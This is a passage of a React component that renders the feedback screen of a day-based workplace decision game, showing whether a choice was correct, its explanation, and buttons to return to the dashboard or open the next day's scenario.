            /* IF COMPLETED: Feedback view styled matching Image 3 */
            <div>
              {/* Decision Feedback Header */}
              <div style={{ marginBottom: "24px", marginTop: "12px" }}>
                <h3
                  style={{
                    margin: 0,
                    fontSize: "18px",
                    fontWeight: 800,
                    color: chosenOption?.isCorrect ? "#16a34a" : chosenOption?.feedbackType === "warning" ? "#d97706" : "#dc2626",
                    display: "flex",
                    alignItems: "center",
                    gap: "8px"
                  }}
                >
                  {chosenOption?.feedbackTitle || "✓ DECISION SUBMITTED"}
                </h3>
              </div>

              {/* WHAT HAPPENED & WHY Box - Styled matching Image 3 */}
              <div
                style={{
                  backgroundColor: chosenOption?.isCorrect ? "var(--bg-green-light)" : "var(--bg-red-light)",
                  border: chosenOption?.isCorrect ? "1px solid var(--border-color)" : "1px solid var(--border-color)",
                  borderRadius: "12px",
                  padding: "24px",
                  marginBottom: "28px"
                }}
              >
                <h4
                  style={{
                    margin: "0 0 12px 0",
                    fontSize: "13px",
                    fontWeight: 800,
                    color: chosenOption?.isCorrect ? "var(--success-dark)" : "var(--danger-color)",
                    textTransform: "uppercase",
                    letterSpacing: "1px"
                  }}
                >
                  WHAT HAPPENED & WHY
                </h4>
                <div style={{ whiteSpace: "pre-line", fontSize: "14px", color: chosenOption?.isCorrect ? "var(--success-dark)" : "var(--danger-color)", lineHeight: "1.7", fontWeight: 500 }}>
                  {chosenOption?.explanation}
                </div>
              </div>

              {/* DAY X COMPLETED Card - Matching Image 3 bottom card */}
              <div
                style={{
                  backgroundColor: "var(--bg-light)",
                  borderRadius: "12px",
                  padding: "24px",
                  textAlign: "center",
                  border: "1px solid var(--border-color)"
                }}
              >
                <h4 style={{ margin: "0 0 8px 0", fontSize: "16px", fontWeight: 800, color: "var(--text-dark)" }}>
                  DAY {selectedDay} COMPLETED ✓
                </h4>
                <p style={{ margin: "0 0 18px 0", fontSize: "13px", color: "var(--text-muted)", fontWeight: 500 }}>
                  Your decisions will influence future workplace situations.
                </p>

                <div style={{ display: "flex", justifyContent: "center", gap: "12px", flexWrap: "wrap" }}>
                  <button
                    onClick={onBackToDashboard}
                    style={{
                      padding: "12px 28px",
                      borderRadius: "8px",
                      backgroundColor: "#5b5bd6",
                      color: "#ffffff",
                      border: "none",
                      fontSize: "14px",
                      fontWeight: 700,
                      cursor: "pointer",
                      boxShadow: "0 4px 10px rgba(91, 91, 214, 0.2)"
                    }}
                  >
                    Return to Dashboard
                  </button>

                  {selectedDay < 30 && (
                    <button
                      onClick={() => handleSelectDay(selectedDay + 1)}
                      style={{
                        padding: "12px 24px",
                        borderRadius: "8px",
                        backgroundColor: "#ffffff",
                        color: "#4f46e5",
                        border: "1px solid #6366f1",
                        fontSize: "14px",
                        fontWeight: 700,
                        cursor: "pointer"
                      }}
                    >
                      Next Day Scenario →
                    </button>
                  )}
                </div>
              </div>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
